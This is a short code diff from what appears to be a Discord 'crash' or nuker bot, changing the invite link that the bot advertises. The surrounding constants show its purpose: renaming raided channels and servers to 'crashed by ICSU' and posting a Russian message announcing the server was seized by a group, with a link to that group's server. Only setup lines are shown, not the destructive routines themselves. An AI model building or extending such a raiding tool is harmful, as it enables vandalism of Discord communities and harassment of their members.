@@ -14,12 +14,12 @@ init()
 intents = discord.Intents.all()
 bot = Bot(command_prefix="!", intents=intents)
 bot.remove_command("help")
-bot.activity = discord.Activity(type=discord.ActivityType.watching, name="https://discord.gg/jPzvYYjRSd")
+bot.activity = discord.Activity(type=discord.ActivityType.watching, name="https://discord.gg/Cju3qReNWy")
 
 CRASH_CHANNEL_NAME = "☠-crashed-by-icsu-{}"
 CRASH_SERVER_NAME = ">>CRSHHD BY ICSU>>"
 CRASH_DESCRIPTION = (
-    "Сервер захвачен группировкой СЕООИ, переходите на наш сервер >>> https://discord.gg/jPzvYYjRSd"
+    "Сервер захвачен группировкой СЕООИ, переходите на наш сервер >>> https://discord.gg/Cju3qReNWy"
 )
 
 pfp = open('icon.png', 'rb').read()
